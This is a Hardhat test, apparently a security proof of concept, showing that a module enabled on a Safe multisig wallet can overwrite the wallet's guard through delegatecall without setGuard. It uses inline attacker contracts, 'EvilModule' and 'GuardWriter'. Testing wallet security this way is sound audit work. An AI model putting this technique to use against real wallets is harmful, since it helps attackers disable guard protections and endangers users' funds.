
// hardhat test (JavaScript)
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Guard can be changed by a module via delegatecall", function () {
  it("violates: guard changed not via setGuard nor owner call", async function () {
    const [owner, attacker, newGuardEOA] = await ethers.getSigners();

    // Deploy Safe singleton and a proxy
    const Safe = await ethers.getContractFactory("Safe");
    const safeSingleton = await Safe.connect(owner).deploy();
    await safeSingleton.deployed();

    const SafeProxy = await ethers.getContractFactory("SafeProxy");
    const proxy = await SafeProxy.connect(owner).deploy(safeSingleton.address);
    await proxy.deployed();

    // Attach Safe ABI at proxy address
    const safe = Safe.attach(proxy.address);

    // Initialize the Safe via proxy fallback
    const setupData = safe.interface.encodeFunctionData("setup", [
      [owner.address], // owners
      1,               // threshold
      ethers.constants.AddressZero, // to
      "0x",            // data
      ethers.constants.AddressZero, // fallbackHandler
      ethers.constants.AddressZero, // paymentToken
      0,                           // payment
      ethers.constants.AddressZero // paymentReceiver
    ]);
    await owner.sendTransaction({ to: proxy.address, data: setupData });

    // Deploy a GuardWriter that writes directly to GUARD_STORAGE_SLOT
    const GuardWriterSrc = `
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.17;
    contract GuardWriter {
        bytes32 constant GUARD_STORAGE_SLOT = 0x4a204f620c8c5ccdca3fd54d003badd85ba500436a431f0cbda4f558c93c34c8;
        function writeGuard(address newGuard) external {
            assembly {
                sstore(GUARD_STORAGE_SLOT, newGuard)
            }
        }
    }`;
    const GuardWriterFactory = await ethers.getContractFactoryFromArtifact(
      await hre.artifacts.readArtifactFromMemory("GuardWriter", GuardWriterSrc)
    );
    const guardWriter = await GuardWriterFactory.connect(attacker).deploy();
    await guardWriter.deployed();

    // Deploy a malicious module that triggers execTransactionFromModule with DelegateCall
    const EvilModuleSrc = `
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity ^0.8.17;
    interface ISafeModuleExec {
        function execTransactionFromModuleReturnData(address to, uint256 value, bytes calldata data, uint8 operation) external returns (bool, bytes memory);
    }
    contract EvilModule {
        function attack(address safe, address writer, address newGuard) external {
            bytes memory data = abi.encodeWithSignature("writeGuard(address)", newGuard);
            (bool success,) = ISafeModuleExec(safe).execTransactionFromModuleReturnData(writer, 0, data, 1);
            require(success, "module exec failed");
        }
    }`;
    const EvilModuleFactory = await ethers.getContractFactoryFromArtifact(
      await hre.artifacts.readArtifactFromMemory("EvilModule", EvilModuleSrc)
    );
    const evilModule = await EvilModuleFactory.connect(attacker).deploy();
    await evilModule.deployed();

    // Enable the malicious module via an owner-signed execTransaction
    const enableData = safe.interface.encodeFunctionData("enableModule", [evilModule.address]);

    // build a "signature" with v=1 so that executor==owner bypasses cryptographic checks
    const r = ethers.utils.hexZeroPad(owner.address, 32);
    const s = ethers.utils.hexZeroPad("0x00", 32);
    const v = "0x01";
    const signatures = r + s.slice(2) + v.slice(2);

    await expect(
      safe.connect(owner).execTransaction(
        safe.address,
        0,
        enableData,
        0, // Enum.Operation.Call
        0, 0, 0,
        ethers.constants.AddressZero,
        ethers.constants.AddressZero,
        signatures
      )
    ).to.emit(safe, "EnabledModule").withArgs(evilModule.address);

    // Verify guard is initially zero
    const GUARD_SLOT = ethers.BigNumber.from("0x4a204f620c8c5ccdca3fd54d003badd85ba500436a431f0cbda4f558c93c34c8");
    let guardBytes = await safe.getStorageAt(GUARD_SLOT, 1);
    let [guardBefore] = ethers.utils.defaultAbiCoder.decode(["address"], guardBytes);
    expect(guardBefore).to.equal(ethers.constants.AddressZero);

    // Module changes the guard via delegatecall to GuardWriter.writeGuard (not via setGuard)
    await evilModule.connect(attacker).attack(safe.address, guardWriter.address, newGuardEOA.address);

    // Confirm guard has been changed without calling setGuard or owner performing the call
    guardBytes = await safe.getStorageAt(GUARD_SLOT, 1);
    const [guardAfter] = ethers.utils.defaultAbiCoder.decode(["address"], guardBytes);
    expect(guardAfter).to.equal(newGuardEOA.address);
  });
});

// Helper to allow inline compilation in this snippet environment.
// In a normal Hardhat project, place the contracts into contracts/ and use getContractFactory("Name").
async function readArtifactFromMemory(name, source) {
  const solc = require("solc");
  const input = {
    language: "Solidity",
    sources: { [`${name}.sol`]: { content: source } },
    settings: { outputSelection: { "*": { "*": ["abi", "evm.bytecode"] } } },
  };
  const output = JSON.parse(solc.compile(JSON.stringify(input)));
  const contract = output.contracts[`${name}.sol`][name];
  return {
    contractName: name,
    abi: contract.abi,
    bytecode: contract.evm.bytecode.object,
  };
}
hre.artifacts.readArtifactFromMemory = readArtifactFromMemory;